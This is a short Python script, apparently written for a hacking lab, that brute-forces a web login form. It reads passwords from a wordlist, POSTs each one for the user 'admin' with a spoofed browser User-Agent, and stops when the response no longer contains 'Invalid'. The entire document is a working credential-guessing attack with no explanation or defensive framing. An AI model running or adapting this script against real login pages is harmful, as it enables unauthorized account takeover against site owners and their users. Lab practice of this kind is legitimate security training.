import requests

#url="http://python.thm/labs/lab1/index.php"
#username=admin
url="http://10.10.11.82:8000/login"
password="list.txt"

headers={
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}
try:
    with open(password,'r') as file:
        for line in file:
            passwords=line.strip()  #removes spaces from the file
            if not passwords:   #this statemet necessay to print all the passwd else will print only 1 passwords
                continue
            data ={"username":"admin","password":passwords}
#            print(data)
            response=requests.post(url,data=data,headers=headers)
#    if "Invalid credentials! Please try again." in response.text:
#               print(f"Invalid password{passwords}")
            if "Invalid" not in response.text:
                print(f"Found credentials:{passwords}")
                break #stops once u find the correct one o you don’t brute-force more once you find it)
            else:
                 print(f"attempted:{passwords}")
except FileNotFoundError:
    print(f"The provided file don't exist{password}")
except requests.RequestException as e:
    print(f"An http error occured{e}")
